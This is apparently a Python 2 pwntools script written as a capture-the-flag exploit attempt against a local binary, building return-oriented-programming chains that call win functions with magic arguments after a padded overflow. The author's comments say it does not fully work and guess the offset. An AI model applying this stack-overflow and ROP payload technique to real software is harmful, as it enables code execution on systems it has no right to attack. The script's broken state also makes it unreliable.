#! /usr/bin/env python2

# Note I could not figure out this with rop.
# this is the closed I got. Most people seams to take the easy route
# and abuse that you can jump to flag function. However win_fn is the function
# you want to abuse if want to learn rop.
# Save this if want to try this again

from pwn import *

p = process("./vuln")
#p = gdb.debug('./vuln', '''break *win_fn''')
e = ELF('./vuln')
win_fn1 = e.sym['win_fn1']
win_fn2 = e.sym['win_fn2']
win_fn = e.sym['win_fn']
flag = e.sym['flag']
main = e.symbols['main']

rop1 = ROP("./vuln")
rop1.call(win_fn1, [0xDEADBEEF])

rop2 = ROP("./vuln")
rop2.call(win_fn2, [0xBAADCAFE, 0xCAFEBABE, 0xABADBABE])

# 72?
payload = p64(main) + rop1.chain() + rop2.chain() + p64(win_fn)
p.sendline(('\x90' * 32 + payload))
p.recvuntil("\n")
p.recvuntil("\n")
p.interactive()


